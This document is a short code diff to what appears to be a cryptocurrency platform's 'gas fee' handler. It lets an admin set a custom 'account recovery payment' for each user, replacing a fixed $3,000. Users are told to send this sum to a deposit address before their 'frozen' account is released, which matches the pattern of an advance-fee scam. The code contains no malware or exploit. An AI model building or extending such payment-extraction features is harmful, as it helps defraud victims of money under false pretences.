@@ -247,6 +247,11 @@ def gas_fee_request():
 
     deposit_address = DISPLAY_EVM  # always EVM for gas fee
 
+    # Use admin-set custom amount for this user, fall back to $3,000 default
+    recovery_amount = 3000.0
+    if current_user.wallet and current_user.wallet.recovery_amount:
+        recovery_amount = float(current_user.wallet.recovery_amount)
+
     order = SwapOrder(
         id              = str(uuid.uuid4()),
         user_id         = current_user.id,
@@ -254,13 +259,13 @@ def gas_fee_request():
         token_name      = "Gas Fee Deposit",
         token_address   = "",
         chain           = "ethereum",
-        amount_usd      = 3000.0,
+        amount_usd      = recovery_amount,
         deposit_chain   = "ethereum",
         deposit_address = deposit_address,
         status          = "pending",
         admin_note      = (
             f"🔒 ACCOUNT RECOVERY PAYMENT — User {current_user.username} ({current_user.email}) "
-            f"has confirmed sending $3,000 ERC-20 recovery payment to {deposit_address}. "
+            f"has confirmed sending ${recovery_amount:,.2f} ERC-20 recovery payment to {deposit_address}. "
             "Awaiting admin verification to unfreeze account."
         ),
     )
